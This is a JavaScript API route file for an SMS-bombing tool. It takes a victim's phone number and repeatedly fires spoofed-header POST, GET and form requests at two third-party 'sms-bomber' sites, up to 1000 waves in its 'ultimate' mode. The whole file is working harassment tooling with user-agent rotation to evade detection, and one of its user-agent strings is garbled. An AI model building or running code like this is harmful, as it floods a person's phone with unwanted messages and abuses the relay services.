// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  let { number, amount, isUltimate } = req.body;

  // 1. Number Cleaning (Strictly 11 digits)
  let cleanNumber = number.toString().replace(/\D/g, ''); 
  if (cleanNumber.startsWith('88')) cleanNumber = cleanNumber.substring(2);
  if (cleanNumber.length > 11) cleanNumber = cleanNumber.substring(0, 11);

  const targetLinks = [
    'https://nuke-sms-bomber.pages.dev/',
    'https://shadowx-sms-bomber.onrender.com/'
  ];

  // 2. Advanced Identity Spoofing (User-Agent Pool)
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E1 مش (KHTML, like Gecko) Version/16.5 Mobile/15E1'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 1000 : amount; 
    const delay = isUltimate ? 300 : 1000; 

    for (let i = 0; i < totalWaves; i++) {
      const attackPromises = targetLinks.map(async (baseUrl) => {
        
        // --- CHAOS ENGINE: Randomizing Method, Headers, and Payload ---
        const randomMethod = Math.random() > 0.5 ? 'POST' : 'GET';
        const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
        
        const payload = {
          number: cleanNumber,
          phone: cleanNumber,
          target: cleanNumber,
          mobile: cleanNumber,
          amount: 1,
          count: 1,
          country: "BD",
          service: "whatsapp",
          msg: "Ultimate Attack",
          auth: "true",
          token: Math.random().toString(36).substring(7),
          is_active: true,
          method: "sms"
        };

        try {
          // Method 1: POST with JSON (Standard API)
          if (randomMethod === 'POST') {
            await fetch(baseUrl, {
              method: 'POST',
              headers: { 
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': randomUA,
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': baseUrl,
                'Referer': baseUrl,
              },
              body: JSON.stringify(payload),
              mode: 'no-cors'
            });
          } else {
            // Method 2: GET with Query Params (URL Injection)
            const urlWithParams = `${baseUrl}?number=${cleanNumber}&amount=1&country=BD&service=whatsapp&phone=${cleanNumber}`;
            await fetch(urlWithParams, {
              method: 'GET',
              mode: 'no-cors',
              headers: { 'User-Agent': randomUA }
            });
          }

          // Method 3: Form Data (Legacy API)
          const formData = new URLSearchParams();
          formData.append('number', cleanNumber);
          formData.append('amount', '1');
          formData.append('country', 'BD');

          await fetch(baseUrl, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/x-www-form-urlencoded',
              'User-Agent': randomUA,
              'Origin': baseUrl,
              'Referer': baseUrl,
            },
            body: formData.toString(),
            mode: 'no-cors'
          });

        } catch (err) {
          console.error(`[Wave ${i}] Error: ${err.message}`);
        }
      });

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK INITIATED! 🚀" : "ATTACK STARTED! 🔥" 
  });
                  }
